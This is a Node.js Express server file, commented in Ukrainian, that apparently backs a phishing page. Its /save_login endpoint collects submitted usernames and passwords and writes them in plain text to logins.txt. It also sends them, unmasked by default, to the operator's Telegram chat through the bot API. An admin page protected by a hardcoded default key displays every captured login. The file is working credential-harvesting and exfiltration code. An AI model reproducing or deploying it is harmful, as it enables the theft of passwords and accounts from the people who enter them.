// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Налаштування через змінні оточення
const BOT_TOKEN = process.env.BOT_TOKEN || '';    // Telegram bot token
const CHAT_ID = process.env.CHAT_ID || '';        // твій chat_id
const ADMIN_KEY = process.env.ADMIN_KEY || 'show81212'; // секрет для /admin
// Опціонально: якщо true — маскувати пароль при відправці в Telegram
const MASK_PASSWORD = (process.env.MASK_PASSWORD || 'false').toLowerCase() === 'true';

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: BOT_TOKEN or CHAT_ID not set. Telegram notifications will be disabled.');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Віддача index.html на /
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Допоміжна функція: маскування пароля (за потреби)
function maskPwd(pwd) {
  if (!pwd) return '';
  if (pwd.length <= 2) return '*'.repeat(pwd.length);
  // залишаємо 2 останні символи видимими
  return '*'.repeat(Math.max(0, pwd.length - 2)) + pwd.slice(-2);
}

// Відправка повідомлення в Telegram
async function sendTelegramMessage(text) {
  if (!BOT_TOKEN || !CHAT_ID) return null;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const resp = await axios.post(url, {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML'
    }, { timeout: 8000 });
    return resp.data;
  } catch (err) {
    console.error('Telegram send error:', err.response?.data || err.message || err);
    return null;
  }
}

// Endpoint для збереження логіну/пароля
app.post('/save_login', async (req, res) => {
  const username = (req.body.username || '').toString().trim();
  const password = (req.body.password || '').toString();
  if (!username || !password) {
    return res.status(400).send('Немає даних для збереження.');
  }

  const time = new Date().toISOString();
  const fullLine = `${time} - ${username} : ${password}\n`;

  // Формуємо текст для Telegram (за налаштуванням маскуємо пароль)
  const sendPass = MASK_PASSWORD ? maskPwd(password) : password;
  const tgText = `<b>New login</b>\nTime: ${time}\nUser: ${username}\nPass: ${sendPass}`;

  // Відправка в Telegram (не блокуємо запис у файл)
  sendTelegramMessage(tgText).then(r => {
    if (r && r.ok) {
      console.log('Telegram: sent');
    } else {
      console.warn('Telegram: not sent or error');
    }
  }).catch(err => {
    console.error('Telegram promise error:', err);
  });

  // Запис у файл (опціонально — зверни увагу, що на деяких free хостингах FS не персистентний)
  const filePath = path.join(__dirname, 'logins.txt');
  fs.appendFile(filePath, fullLine, (err) => {
    if (err) {
      console.error('File write error:', err);
      // Відповідаємо успішно, бо повідомлення в Telegram могло піти
      return res.status(200).send('Дані отримано (Telegram). Але помилка запису у файл.');
    }
    res.send('Дані збережено (Telegram + файл).');
  });
});

// Адмін-форма для перегляду логів
app.get('/admin', (req, res) => {
  const html = `<!doctype html>
  <html><head><meta charset="utf-8"><title>Admin</title></head><body style="font-family:Arial,sans-serif;padding:20px;">
  <h2>Admin — показати логіни</h2>
  <form method="POST" action="/view_logins">
    <label>Секрет: <input name="key" type="password" autofocus></label>
    <button type="submit">Показати логіни</button>
  </form>
  <p style="color:#666;font-size:13px">Секрет: встановити в ADMIN_KEY змінній середовища.</p>
  </body></html>`;
  res.type('html').send(html);
});

// Показ логів (POST)
app.post('/view_logins', (req, res) => {
  const key = (req.body.key || '').toString();
  if (!key || key !== ADMIN_KEY) {
    setTimeout(() => res.status(403).send('Access denied'), 300);
    return;
  }
  const filePath = path.join(__dirname, 'logins.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
      console.error(err);
      return res.status(500).send('Помилка при читанні файлу.');
    }
    res.type('text/plain').send(data);
  });
});

// Доступ через GET (з query ?key=...) — зручний, але менш безпечний
app.get('/view_logins', (req, res) => {
  const key = (req.query.key || '').toString();
  if (!key || key !== ADMIN_KEY) return res.status(403).send('Access denied');
  const filePath = path.join(__dirname, 'logins.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
      console.error(err);
      return res.status(500).send('Помилка при читанні файлу.');
    }
    res.type('text/plain').send(data);
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

